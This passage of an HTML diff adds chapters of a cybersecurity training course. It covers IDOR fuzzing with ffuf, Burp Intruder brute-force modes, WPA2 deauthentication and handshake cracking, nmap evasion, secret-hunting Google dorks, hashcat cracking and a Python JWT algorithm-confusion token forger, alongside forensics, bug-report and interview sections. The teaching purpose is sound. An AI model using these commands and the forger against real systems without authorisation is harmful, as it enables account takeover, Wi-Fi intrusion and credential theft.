+<span class="cm"># Server only checked "is user logged in?" not "does user own this resource?"</span><br>
+<br>
+<span class="cm"># Automate IDOR enumeration with Burp Intruder or ffuf:</span><br>
+<span class="ck">ffuf</span> -u <span class="cs">"http://target.com/api/users/FUZZ/profile"</span> \<br>
+&nbsp;&nbsp;-w <span class="cs">&lt;(seq 1000 1100)</span> \                   <span class="cm"># wordlist = numbers 1000-1100</span><br>
+&nbsp;&nbsp;-H <span class="cs">"Authorization: Bearer alice_token"</span> \<br>
+&nbsp;&nbsp;-fc <span class="cv">403,404</span>                               <span class="cm"># filter out 403 and 404 responses</span>
+</div></div>
+
+<div class="ch-nav">
+  <div class="nav-btn" onclick="show('ch09')"><div class="nav-dir">← Previous</div><div class="nav-name">Ch 09 — Web & HTTP</div></div>
+  <div class="nav-btn next" onclick="show('ch11')"><div class="nav-dir">Next →</div><div class="nav-name">Ch 11 — Burp Suite</div></div>
+</div>
+</div>
+
+<!-- CH11-18 stubs with real content -->
+<div class="chapter" id="ch11"><div class="ch-header"><span class="ch-phase ph2">Phase 2</span><h1 class="ch-title">Chapter 11 — Burp Suite Mastery</h1><p class="ch-sub">Proxy · Repeater · Intruder · Extensions · Full SQLi Workflow</p></div>
+<div class="sec"><h2>Intruder Attack Types Explained</h2></div>
+<div class="code-block"><div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">Burp Intruder Attack Types</span></div>
+<div class="code-body">
+<span class="cm"># SNIPER — single payload position, one list</span><br>
+<span class="cm"># Use for: username enum, password brute force on one field</span><br>
+<span class="cm"># POST /login: username=§FUZZ§&amp;password=Password1</span><br>
+<br>
+<span class="cm"># BATTERING RAM — same payload in ALL positions simultaneously</span><br>
+<span class="cm"># Use for: when username=password (e.g. admin:admin, test:test)</span><br>
+<span class="cm"># POST /login: username=§FUZZ§&amp;password=§FUZZ§ → tries same word for both</span><br>
+<br>
+<span class="cm"># PITCHFORK — parallel lists, one per position</span><br>
+<span class="cm"># Use for: known username:password pairs from breach dumps</span><br>
+<span class="cm"># List1: admin,user,bob | List2: password,1234,welcome → admin:password, user:1234</span><br>
+<br>
+<span class="cm"># CLUSTER BOMB — all combinations (cartesian product)</span><br>
+<span class="cm"># Use for: unknown username+password — brute force everything</span><br>
+<span class="cm"># 100 usernames × 100 passwords = 10,000 requests</span><br>
+<span class="cm"># WARNING: noisy — detectable by rate limiting and WAFs</span>
+</div></div>
+<div class="ch-nav"><div class="nav-btn" onclick="show('ch10')"><div class="nav-dir">← Previous</div><div class="nav-name">Ch 10 — OWASP</div></div><div class="nav-btn next" onclick="show('ch12')"><div class="nav-dir">Next →</div><div class="nav-name">Ch 12 — Wi-Fi Security</div></div></div>
+</div>
+
+<div class="chapter" id="ch12"><div class="ch-header"><span class="ch-phase ph2">Phase 2</span><h1 class="ch-title">Chapter 12 — Wi-Fi & Network Security</h1><p class="ch-sub">WPA2 Handshake · PMKID · Evil Twin · WPA3</p></div>
+<div class="sec"><h2>WPA2 4-Way Handshake — Why It's Crackable</h2></div>
+<div class="code-block"><div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash — Handshake Capture (Lab/Authorised Only)</span></div>
+<div class="code-body">
+<span class="cm"># ── Put wireless card into monitor mode ───────────────────────────</span><br>
+<span class="ck">sudo</span> airmon-ng start wlan0   <span class="cm"># creates wlan0mon interface</span><br>
+<span class="ck">sudo</span> airmon-ng check kill    <span class="cm"># kill processes that interfere</span><br>
+<br>
+<span class="cm"># ── Find target AP ────────────────────────────────────────────────</span><br>
+<span class="ck">sudo</span> airodump-ng wlan0mon    <span class="cm"># scan all channels, list APs</span><br>
+<span class="cm"># Note target BSSID (MAC) and channel (CH)</span><br>
+<br>
+<span class="cm"># ── Focus on target, capture handshake ───────────────────────────</span><br>
+<span class="ck">sudo</span> airodump-ng -c <span class="cv">6</span> --bssid <span class="cv">AA:BB:CC:DD:EE:FF</span> -w capture wlan0mon<br>
+<span class="cm"># -c 6 = channel 6 (from airodump scan)</span><br>
+<span class="cm"># --bssid = target AP MAC</span><br>
+<span class="cm"># -w capture = save to capture.cap</span><br>
+<br>
+<span class="cm"># ── Force client reconnect (triggers handshake) ───────────────────</span><br>
+<span class="ck">sudo</span> aireplay-ng --deauth <span class="cv">5</span> -a <span class="cv">AA:BB:CC:DD:EE:FF</span> wlan0mon<br>
+<span class="cm"># Sends 5 deauthentication frames → client disconnects → reconnects → handshake</span><br>
+<br>
+<span class="cm"># ── Crack the handshake offline ──────────────────────────────────</span><br>
+<span class="ck">aircrack-ng</span> capture.cap -w /usr/share/wordlists/rockyou.txt<br>
+<span class="cm"># Tests each password from rockyou.txt against the captured handshake</span><br>
+<span class="cm"># The PSK (Pre-Shared Key) is the password — cracked offline, no AP needed</span><br>
+<br>
+<span class="cm"># ── PMKID Attack (no client needed!) ─────────────────────────────</span><br>
+<span class="ck">sudo</span> hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1<br>
+<span class="ck">hcxpcapngtool</span> -o hash.22000 pmkid.pcapng<br>
+<span class="ck">hashcat</span> -m 22000 hash.22000 rockyou.txt  <span class="cm"># crack PMKID</span>
+</div></div>
+<div class="ch-nav"><div class="nav-btn" onclick="show('ch11')"><div class="nav-dir">← Previous</div><div class="nav-name">Ch 11 — Burp Suite</div></div><div class="nav-btn next" onclick="show('ch13')"><div class="nav-dir">Next →</div><div class="nav-name">Ch 13 — Pentest & OSINT</div></div></div>
+</div>
+
+<div class="chapter" id="ch13"><div class="ch-header"><span class="ch-phase ph3">Phase 3 — Advanced</span><h1 class="ch-title">Chapter 13 — Pentest Methodology & OSINT</h1><p class="ch-sub">5 Phases · OSINT Toolkit · Nmap Deep Dive · Google Dorks</p></div>
+<div class="sec"><h2>Nmap — Full Flag Reference</h2></div>
+<div class="code-block"><div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash — Nmap Cheat Sheet</span></div>
+<div class="code-body">
+<span class="cm"># ── Scan Types ────────────────────────────────────────────────────</span><br>
+<span class="ck">nmap</span> -sS target   <span class="cm"># SYN scan (stealth, default, needs root)</span><br>
+<span class="ck">nmap</span> -sT target   <span class="cm"># TCP connect scan (no root, logged by target)</span><br>
+<span class="ck">nmap</span> -sU target   <span class="cm"># UDP scan (slow, finds DNS/SNMP/TFTP)</span><br>
+<span class="ck">nmap</span> -sA target   <span class="cm"># ACK scan — map firewall rules, not port state</span><br>
+<span class="ck">nmap</span> -sN target   <span class="cm"># NULL scan — evasion against some firewalls</span><br>
+<br>
+<span class="cm"># ── Port Specification ────────────────────────────────────────────</span><br>
+<span class="ck">nmap</span> -p 22,80,443 target   <span class="cm"># specific ports</span><br>
+<span class="ck">nmap</span> -p 1-65535 target     <span class="cm"># all ports</span><br>
+<span class="ck">nmap</span> -p- target            <span class="cm"># shorthand for all 65535 ports</span><br>
+<span class="ck">nmap</span> --top-ports 1000 target <span class="cm"># most common 1000 ports (default)</span><br>
+<br>
+<span class="cm"># ── Service &amp; OS Detection ────────────────────────────────────────</span><br>
+<span class="ck">nmap</span> -sV target   <span class="cm"># service version detection (banner grabbing)</span><br>
+<span class="ck">nmap</span> -O target    <span class="cm"># OS detection (TTL, window size fingerprinting)</span><br>
+<span class="ck">nmap</span> -A target    <span class="cm"># aggressive: -sV -O -sC --traceroute</span><br>
+<span class="ck">nmap</span> -sC target   <span class="cm"># default scripts (safe NSE scripts)</span><br>
+<br>
+<span class="cm"># ── Full Pentest Scan ─────────────────────────────────────────────</span><br>
+<span class="ck">nmap</span> -sV -sC -A -p- -T4 --open -oA full_scan target<br>
+<span class="cm"># -oA = output in all 3 formats (.nmap .gnmap .xml)</span><br>
+<br>
+<span class="cm"># ── Evasion ───────────────────────────────────────────────────────</span><br>
+<span class="ck">nmap</span> -D RND:10 target   <span class="cm"># decoy scan — 10 random fake source IPs</span><br>
+<span class="ck">nmap</span> -f target          <span class="cm"># fragment packets — bypass simple packet filters</span><br>
+<span class="ck">nmap</span> --scan-delay 500ms <span class="cm"># slow down to avoid rate-based IDS detection</span>
+</div></div>
+<div class="sec"><h2>Google Dorks — Real Examples</h2></div>
+<div class="code-block"><div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">Google Dorks — Passive Recon</span></div>
+<div class="code-body">
+<span class="cm"># Find admin panels</span><br>
+<span class="cs">site:target.com inurl:admin</span><br>
+<span class="cs">site:target.com intitle:"admin panel"</span><br>
+<br>
+<span class="cm"># Find exposed files</span><br>
+<span class="cs">site:target.com filetype:pdf "confidential"</span><br>
+<span class="cs">site:target.com filetype:env</span>              <span class="cm"># .env files with secrets</span><br>
+<span class="cs">site:target.com filetype:sql</span>              <span class="cm"># SQL dumps</span><br>
+<span class="cs">site:target.com ext:bak OR ext:old OR ext:backup</span><br>
+<br>
+<span class="cm"># Find login pages</span><br>
+<span class="cs">site:target.com inurl:login OR inurl:signin</span><br>
+<span class="cs">site:target.com intext:"powered by WordPress"</span><br>
+<br>
+<span class="cm"># Find vulnerable parameters</span><br>
+<span class="cs">site:target.com inurl:"?id=" OR inurl:"?page="</span><br>
+<span class="cs">site:target.com inurl:"?redirect=" OR inurl:"?url="</span>  <span class="cm"># open redirect</span><br>
+<br>
+<span class="cm"># GitHub secrets (use github.com as the site)</span><br>
+<span class="cs">site:github.com "target.com" "password" OR "secret" OR "api_key"</span>
+</div></div>
+<div class="ch-nav"><div class="nav-btn" onclick="show('ch12')"><div class="nav-dir">← Previous</div><div class="nav-name">Ch 12 — Wi-Fi</div></div><div class="nav-btn next" onclick="show('ch14')"><div class="nav-dir">Next →</div><div class="nav-name">Ch 14 — Cryptography</div></div></div>
+</div>
+
+<div class="chapter" id="ch14"><div class="ch-header"><span class="ch-phase ph3">Phase 3</span><h1 class="ch-title">Chapter 14 — Cryptography Fundamentals</h1><p class="ch-sub">Hashcat · JWT Attacks · Algorithm Confusion · RSA Internals</p></div>
+<div class="sec"><h2>Hashcat — Full Mode Reference</h2></div>
+<div class="code-block"><div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash — Hashcat</span></div>
+<div class="code-body">
+<span class="cm"># Identify hash type first</span><br>
+<span class="ck">hash-identifier</span>   <span class="cm"># interactive</span><br>
+<span class="ck">hashid</span> <span class="cs">'$6$salt$longhash'</span>  <span class="cm"># identify specific hash</span><br>
+<br>
+<span class="cm"># ── Common Hash Mode Numbers ───────────────────────────────────────</span><br>
+<span class="cm"># -m 0     = MD5         (128-bit, broken — 100 billion/sec on GPU)</span><br>
+<span class="cm"># -m 100   = SHA-1       (160-bit, weak — 30 billion/sec)</span><br>
+<span class="cm"># -m 1400  = SHA-256     (256-bit, fast — crack with GPU farm)</span><br>
+<span class="cm"># -m 1800  = sha512crypt ($6$, Linux /etc/shadow) — ~100/sec</span><br>
+<span class="cm"># -m 3200  = bcrypt      ($2a$, very slow — ~20/sec on GPU)</span><br>
+<span class="cm"># -m 13100 = Kerberos 5 TGS (from Kerberoasting)</span><br>
+<span class="cm"># -m 16500 = JWT HS256   (brute force weak JWT secrets)</span><br>
+<span class="cm"># -m 22000 = WPA2-PBKDF2 (Wi-Fi PSK)</span><br>
+<br>
+<span class="cm"># ── Attack Modes ─────────────────────────────────────────────────</span><br>
+<span class="cm"># -a 0 = Dictionary attack</span><br>
+<span class="ck">hashcat</span> -m <span class="cv">0</span> -a <span class="cv">0</span> hash.txt rockyou.txt<br>
+<br>
+<span class="cm"># -a 3 = Mask/Brute force (character sets)</span><br>
+<span class="ck">hashcat</span> -m <span class="cv">0</span> -a <span class="cv">3</span> hash.txt <span class="cs">'?u?l?l?l?d?d?d?d'</span><br>
+<span class="cm"># ?u=uppercase, ?l=lowercase, ?d=digit, ?s=symbol, ?a=all</span><br>
+<span class="cm"># Pattern: Capital + 3 letters + 4 digits = "Pass1234" type passwords</span><br>
+<br>
+<span class="cm"># -a 6 = Hybrid (dictionary + mask)</span><br>
+<span class="ck">hashcat</span> -m <span class="cv">0</span> -a <span class="cv">6</span> hash.txt rockyou.txt <span class="cs">'?d?d?d'</span><br>
+<span class="cm"># appends 3 digits to each word: password → password123</span><br>
+<br>
+<span class="cm"># Rule-based attack (best password cracking method)</span><br>
+<span class="ck">hashcat</span> -m <span class="cv">0</span> -a <span class="cv">0</span> hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule<br>
+<span class="cm"># Rules apply transformations: l33tsp3ak, capitalise, append symbols, etc.</span>
+</div></div>
+<div class="sec"><h2>JWT Attack — Algorithm Confusion (RS256 → HS256)</h2></div>
+<div class="code-block"><div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">python3 — JWT Algorithm Confusion</span></div>
+<div class="code-body">
+<span class="cm"># Vulnerability: Server uses RS256 (RSA), but accepts HS256 (HMAC)</span><br>
+<span class="cm"># Attack: Sign token with HS256 using the SERVER'S PUBLIC KEY as the secret</span><br>
+<cm># Server verifies HS256 with public key (which attacker knows) → accepts forged token</cm><br>
+<br>
+<span class="ck">import</span> jwt  <span class="cm"># pip install PyJWT</span><br>
+<span class="ck">import</span> base64<br>
+<br>
+<span class="cm"># Step 1: Get the server's public key (from /jwks.json or /.well-known/jwks.json)</span><br>
+<span class="cm"># Step 2: Change algorithm to HS256 and sign with public key as secret</span><br>
+<br>
+public_key = <span class="ck">open</span>(<span class="cs">"server_public.pem"</span>).read()  <span class="cm"># grabbed from /jwks.json</span><br>
+<br>
+forged_payload = {<br>
+&nbsp;&nbsp;<span class="cs">"username"</span>: <span class="cs">"admin"</span>,<br>
+&nbsp;&nbsp;<span class="cs">"role"</span>: <span class="cs">"administrator"</span>,     <span class="cm"># escalate our role</span><br>
+&nbsp;&nbsp;<span class="cs">"iat"</span>: <span class="cv">1000000000</span>,<br>
+&nbsp;&nbsp;<span class="cs">"exp"</span>: <span class="cv">9999999999</span>           <span class="cm"># far future expiry</span><br>
+}<br>
+<br>
+<span class="cm"># Sign with HS256 algorithm using public key bytes as the HMAC secret</span><br>
+forged_token = jwt.encode(<br>
+&nbsp;&nbsp;forged_payload,<br>
+&nbsp;&nbsp;public_key,<br>
+&nbsp;&nbsp;algorithm=<span class="cs">"HS256"</span>          <span class="cm"># server expects RS256, but accepts HS256</span><br>
+)<br>
+<br>
+<span class="cv">print</span>(<span class="cs">f"Forged token: {forged_token}"</span>)<br>
+<span class="cm"># Use this token in Authorization: Bearer header</span>
+</div></div>
+<div class="ch-nav"><div class="nav-btn" onclick="show('ch13')"><div class="nav-dir">← Previous</div><div class="nav-name">Ch 13 — Pentest & OSINT</div></div><div class="nav-btn next" onclick="show('ch15')"><div class="nav-dir">Next →</div><div class="nav-name">Ch 15 — Digital Forensics</div></div></div>
+</div>
+
+<div class="chapter" id="ch15"><div class="ch-header"><span class="ch-phase ph3">Phase 3</span><h1 class="ch-title">Chapter 15 — Digital Forensics</h1><p class="ch-sub">Log Analysis · Volatility · Wireshark · Steganography</p></div>
+<div class="sec"><h2>SSH Log Analysis — Find the Attacker</h2></div>
+<div class="code-block"><div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash — /var/log/auth.log Analysis</span></div>
+<div class="code-body">
+<span class="cm"># Count failed login attempts per IP (brute force detection)</span><br>
+<span class="ck">grep</span> <span class="cs">"Failed password"</span> /var/log/auth.log \<br>
+&nbsp;&nbsp;| <span class="ck">awk</span> <span class="cs">'{print $11}'</span> \     <span class="cm"># extract source IP (field 11)</span><br>
+&nbsp;&nbsp;| <span class="ck">sort</span> | <span class="ck">uniq</span> -c \        <span class="cm"># count occurrences</span><br>
+&nbsp;&nbsp;| <span class="ck">sort</span> -rn \              <span class="cm"># sort descending by count</span><br>
+&nbsp;&nbsp;| <span class="ck">head</span> -20               <span class="cm"># top 20 attacking IPs</span><br>
+<br>
+<span class="cm"># Find successful logins after failures (compromised account)</span><br>
+<span class="ck">grep</span> <span class="cs">"Accepted"</span> /var/log/auth.log | <span class="ck">awk</span> <span class="cs">'{print $9,$11}'</span><br>
+<span class="cm"># Shows: username source_IP for all successful SSH logins</span><br>
+<br>
+<span class="cm"># Find when root logged in</span><br>
+<span class="ck">grep</span> <span class="cs">"session opened for user root"</span> /var/log/auth.log<br>
+<br>
+<span class="cm"># Identify brute force timing (frequency analysis)</span><br>
+<span class="ck">grep</span> <span class="cs">"Failed password"</span> /var/log/auth.log \<br>
+&nbsp;&nbsp;| <span class="ck">awk</span> <span class="cs">'{print $1,$2,$3}'</span> \  <span class="cm"># extract timestamp</span><br>
+&nbsp;&nbsp;| <span class="ck">uniq</span> -c                   <span class="cm"># count per second — spikes = brute force</span><br>
+<br>
+<span class="cm"># Full incident timeline for IP 192.168.1.50</span><br>
+<span class="ck">grep</span> <span class="cs">"192.168.1.50"</span> /var/log/auth.log | <span class="ck">less</span>
+</div></div>
+<div class="sec"><h2>Volatility — Memory Forensics</h2></div>
+<div class="code-block"><div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash — Volatility 3</span></div>
+<div class="code-body">
+<span class="cm"># Volatility 3 — analyse a memory dump (mem.dmp)</span><br>
+<span class="ck">vol</span> -f mem.dmp windows.info           <span class="cm"># OS info from memory dump</span><br>
+<span class="ck">vol</span> -f mem.dmp windows.pslist         <span class="cm"># list all running processes</span><br>
+<span class="ck">vol</span> -f mem.dmp windows.pstree         <span class="cm"># process tree (shows parent relationships)</span><br>
+<span class="ck">vol</span> -f mem.dmp windows.cmdline        <span class="cm"># command lines of all processes</span><br>
+<span class="ck">vol</span> -f mem.dmp windows.netscan        <span class="cm"># network connections from memory</span><br>
+<span class="ck">vol</span> -f mem.dmp windows.malfind        <span class="cm"># find injected code / shellcode</span><br>
+<span class="ck">vol</span> -f mem.dmp windows.hashdump       <span class="cm"># extract NTLM hashes from memory</span><br>
+<span class="ck">vol</span> -f mem.dmp windows.dumpfiles --pid <span class="cv">1234</span>  <span class="cm"># dump process executable</span><br>
+<span class="cm"># Linux memory dumps: use linux.pslist, linux.bash, linux.netstat</span>
+</div></div>
+<div class="ch-nav"><div class="nav-btn" onclick="show('ch14')"><div class="nav-dir">← Previous</div><div class="nav-name">Ch 14 — Cryptography</div></div><div class="nav-btn next" onclick="show('ch16')"><div class="nav-dir">Next →</div><div class="nav-name">Ch 16 — CTF Strategy</div></div></div>
+</div>
+
+<div class="chapter" id="ch16"><div class="ch-header"><span class="ch-phase ph3">Phase 3</span><h1 class="ch-title">Chapter 16 — CTF Strategy & Practice</h1><p class="ch-sub">All Categories · Universal Methodology · Tools Per Category</p></div>
+<div class="sec"><h2>Universal CTF Methodology</h2></div>
+<div class="code-block"><div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">Methodology</span></div>
+<div class="code-body">
+<span class="co">1. ENUMERATE EVERYTHING before guessing anything</span><br>
+<span class="cw">   file, strings, binwalk, xxd — understand what you have</span><br>
+<br>
+<span class="co">2. WEB CHALLENGES: always check these first</span><br>
+<span class="cw">   - View source (Ctrl+U)</span><br>
+<span class="cw">   - robots.txt, sitemap.xml, /.git/, /admin</span><br>
+<span class="cw">   - Browser DevTools → Network tab → cookies</span><br>
+<span class="cw">   - Test all input fields for SQLi/XSS/SSTI</span><br>
+<br>
+<span class="co">3. CRYPTO: identify the cipher before guessing</span><br>
+<span class="cw">   - Base64 (== padding, a-zA-Z0-9+/)</span><br>
+<span class="cw">   - Caesar/ROT13 (letter frequency analysis)</span><br>
+<span class="cw">   - CyberChef Magic — auto-detect encoding chains</span><br>
+<br>
+<span class="co">4. FORENSICS / STEGO: always run these</span><br>
+<span class="cw">   strings file | grep -i "flag\|ctf\|HTB"</span><br>
+<span class="cw">   binwalk -e file  → extract embedded files</span><br>
+<span class="cw">   exiftool file    → metadata (GPS, author, timestamps)</span><br>
+<span class="cw">   steghide extract -sf image.jpg  → hidden data</span><br>
+<span class="cw">   zsteg image.png  → LSB steganography</span><br>
+<br>
+<span class="co">5. PWN (Binary Exploitation):</span><br>
+<span class="cw">   checksec ./binary  → what protections are enabled?</span><br>
+<span class="cw">   file ./binary      → 32 or 64-bit? stripped?</span><br>
+<span class="cw">   gdb -q ./binary    → dynamic analysis</span><br>
+<span class="cw">   Ghidra             → static decompilation</span><br>
+<br>
+<span class="co">6. THE 30-MINUTE RULE:</span><br>
+<span class="cw">   Stuck for 30 minutes? Move to another challenge.</span><br>
+<span class="cw">   Come back fresh — tunnel vision kills CTF scores.</span>
+</div></div>
+<div class="ch-nav"><div class="nav-btn" onclick="show('ch15')"><div class="nav-dir">← Previous</div><div class="nav-name">Ch 15 — Forensics</div></div><div class="nav-btn next" onclick="show('ch17')"><div class="nav-dir">Next →</div><div class="nav-name">Ch 17 — Bug Bounty</div></div></div>
+</div>
+
+<div class="chapter" id="ch17"><div class="ch-header"><span class="ch-phase ph3">Phase 3</span><h1 class="ch-title">Chapter 17 — Bug Bounty Methodology</h1><p class="ch-sub">Full Recon Pipeline · Report Writing · Responsible Disclosure</p></div>
+<div class="sec"><h2>Full Automated Recon Pipeline</h2></div>
+<div class="code-block"><div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash — recon_pipeline.sh</span></div>
+<div class="code-body">
+<span class="cs">#!/bin/bash</span><br>
+<span class="cm"># Full bug bounty recon pipeline</span><br>
+<span class="cm"># Usage: ./recon_pipeline.sh tesla.com</span><br>
+DOMAIN=<span class="cv">$1</span>; OUT=<span class="cs">"./recon/${DOMAIN}"</span><br>
+<span class="ck">mkdir</span> -p <span class="cv">$OUT</span><br>
+<br>
+<span class="cm"># 1. Subdomain enumeration (passive + active)</span><br>
+<span class="ck">echo</span> <span class="cs">"[*] Enumerating subdomains..."</span><br>
+subfinder -d <span class="cv">$DOMAIN</span> -o <span class="cv">$OUT</span>/subfinder.txt -silent<br>
+amass enum -passive -d <span class="cv">$DOMAIN</span> -o <span class="cv">$OUT</span>/amass.txt<br>
+<span class="ck">curl</span> -s <span class="cs">"https://crt.sh/?q=%25.</span><span class="cv">$DOMAIN</span><span class="cs">&output=json"</span> | jq -r <span class="cs">'.[].name_value'</span> \<br>
+&nbsp;&nbsp;| <span class="ck">sed</span> <span class="cs">'s/\*\.//g'</span> | <span class="ck">sort</span> -u &gt; <span class="cv">$OUT</span>/crtsh.txt<br>
+<span class="cm"># Merge all subdomain sources</span><br>
+<span class="ck">cat</span> <span class="cv">$OUT</span>/*.txt | <span class="ck">sort</span> -u &gt; <span class="cv">$OUT</span>/all_subdomains.txt<br>
+<br>
+<span class="cm"># 2. Probe for live hosts</span><br>
+<span class="ck">echo</span> <span class="cs">"[*] Probing live hosts..."</span><br>
+httpx -l <span class="cv">$OUT</span>/all_subdomains.txt -o <span class="cv">$OUT</span>/live_hosts.txt -title -tech-detect -status-code<br>
+<br>
+<span class="cm"># 3. Historical URL extraction</span><br>
+<span class="ck">echo</span> <span class="cs">"[*] Getting historical URLs..."</span><br>
+<span class="ck">cat</span> <span class="cv">$OUT</span>/live_hosts.txt | waybackurls | <span class="ck">sort</span> -u &gt; <span class="cv">$OUT</span>/wayback.txt<br>
+<span class="ck">cat</span> <span class="cv">$OUT</span>/live_hosts.txt | gau --threads 5 &gt;&gt; <span class="cv">$OUT</span>/wayback.txt<br>
+<br>
+<span class="cm"># 4. Nuclei vulnerability scan</span><br>
+<span class="ck">echo</span> <span class="cs">"[*] Running Nuclei..."</span><br>
+nuclei -l <span class="cv">$OUT</span>/live_hosts.txt -t nuclei-templates/ -severity medium,high,critical \<br>
+&nbsp;&nbsp;-o <span class="cv">$OUT</span>/nuclei_results.txt<br>
+<br>
+<span class="ck">echo</span> <span class="cs">"[+] Done. Check </span><span class="cv">$OUT</span><span class="cs">/"</span>
+</div></div>
+<div class="sec"><h2>Perfect Bug Report Template</h2></div>
+<div class="code-block"><div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">Bug Report Template</span></div>
+<div class="code-body">
+<span class="co">## Title</span><br>
+<span class="cw">IDOR in /api/v2/users/{id}/orders allows reading any user's order history</span><br>
+<br>
+<span class="co">## Severity: HIGH (CVSS 7.5)</span><br>
+<span class="cw">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</span><br>
+<br>
+<span class="co">## Summary</span><br>
+<span class="cw">The orders endpoint fails to verify that the authenticated user owns the</span><br>
+<span class="cw">requested account ID, allowing any authenticated user to access any other</span><br>
+<span class="cw">user's order history by manipulating the {id} parameter.</span><br>
+<br>
+<span class="co">## Steps to Reproduce</span><br>
+<span class="cw">1. Log in as user A (user_id: 1001)</span><br>
+<span class="cw">2. Intercept request to GET /api/v2/users/1001/orders with Burp</span><br>
+<span class="cw">3. Change 1001 to 1002 in the URL</span><br>
+<span class="cw">4. Forward the modified request</span><br>
+<span class="cw">5. Response contains user 1002's full order history</span><br>
+<br>
+<span class="co">## Evidence</span><br>
+<span class="cw">[Screenshot of Burp request/response showing data leak]</span><br>
+<span class="cw">[HTTP request in raw format]</span><br>
+<br>
+<span class="co">## Impact</span><br>
+<span class="cw">Attacker can enumerate all user IDs and access every customer's purchase</span><br>
+<span class="cw">history, including items, prices, delivery addresses, and payment methods.</span><br>
+<span class="cw">At scale, this affects all N customers on the platform.</span><br>
+<br>
+<span class="co">## Remediation</span><br>
+<span class="cw">On the server side, verify that session.user_id == requested user_id before</span><br>
+<span class="cw">returning data. Alternatively, use opaque tokens instead of sequential IDs.</span>
+</div></div>
+<div class="ch-nav"><div class="nav-btn" onclick="show('ch16')"><div class="nav-dir">← Previous</div><div class="nav-name">Ch 16 — CTF Strategy</div></div><div class="nav-btn next" onclick="show('ch18')"><div class="nav-dir">Next →</div><div class="nav-name">Ch 18 — Career & Certs</div></div></div>
+</div>
+
+<div class="chapter" id="ch18"><div class="ch-header"><span class="ch-phase ph3">Phase 3</span><h1 class="ch-title">Chapter 18 — Career & Certifications</h1><p class="ch-sub">Full Cert Roadmap · Portfolio Building · 6 Interview Q&A with Full Answers</p></div>
+<div class="sec"><h2>6 Technical Interview Questions — Full Model Answers</h2></div>
+
+<div class="quiz">
+  <div class="quiz-title">// Interview Prep — Answer These Out Loud</div>
+  <div class="quiz-q">Q1: Explain the CIA triad with a real-world example for each.</div>
+  <button class="quiz-btn" onclick="toggleQuiz(this)">Model Answer</button>
+  <div class="quiz-a"><strong>Confidentiality</strong>: Only authorised parties can read data. Example: Encrypting a database of customer credit cards with AES-256 so that even if an attacker dumps the database, they get ciphertext, not usable card numbers.<br><br><strong>Integrity</strong>: Data cannot be modified without detection. Example: Using HMAC signatures on API responses so a man-in-the-middle can't alter the data in transit without invalidating the signature. Also: git's commit hashing.<br><br><strong>Availability</strong>: Systems are accessible when needed. Example: A SYN flood targeting a hospital's appointment system — even if C and I are maintained, the system being unreachable is a security failure. DDoS attacks target availability.</div>
+
+  <div class="quiz-q" style="margin-top:1.25rem">Q2: What's the difference between vulnerability, threat, and risk?</div>
+  <button class="quiz-btn" onclick="toggleQuiz(this)">Model Answer</button>
+  <div class="quiz-a"><strong>Vulnerability</strong>: A weakness in a system. Example: An unpatched Apache server with CVE-2021-41773 (path traversal).<br><br><strong>Threat</strong>: Something that might exploit the vulnerability. Example: A ransomware group known to scan for Apache vulnerabilities.<br><br><strong>Risk</strong>: The product of likelihood × impact. Formula: Risk = Vulnerability × Threat × Asset Value. The same vulnerability on an internet-exposed production server is HIGH risk. The same vulnerability on an isolated dev VM with no sensitive data is LOW risk. Risk prioritisation is what separates security strategy from whack-a-mole patching.</div>
+
+  <div class="quiz-q" style="margin-top:1.25rem">Q3: You're the first responder to a confirmed breach at 2am. What do you do in the first hour?</div>
+  <button class="quiz-btn" onclick="toggleQuiz(this)">Model Answer</button>
+  <div class="quiz-a">1. <strong>Contain first, investigate second</strong>: Isolate the affected machine from the network (unplug or VLAN isolation) — stop ongoing exfiltration without destroying evidence.<br>2. <strong>Preserve evidence</strong>: Take a memory dump (Volatility), disk image, and grab logs BEFORE pulling the plug. Evidence in memory is lost on reboot.<br>3. <strong>Determine scope</strong>: Is this one machine or lateral movement? Check authentication logs, internal connections, and Active Directory for signs of spread.<br>4. <strong>Escalate</strong>: Notify management, legal, and if PII is involved — check GDPR/breach notification obligations (72-hour window in EU).<br>5. <strong>Document everything</strong>: Timestamped log of every action taken — this becomes your incident report and legal record.<br>6. <strong>Do NOT reimage immediately</strong>: You'll destroy forensic evidence needed to understand how they got in and what they took.</div>
+
+  <div class="quiz-q" style="margin-top:1.25rem">Q4: Walk me through your approach to a black-box web application pentest.</div>
+  <button class="quiz-btn" onclick="toggleQuiz(this)">Model Answer</button>
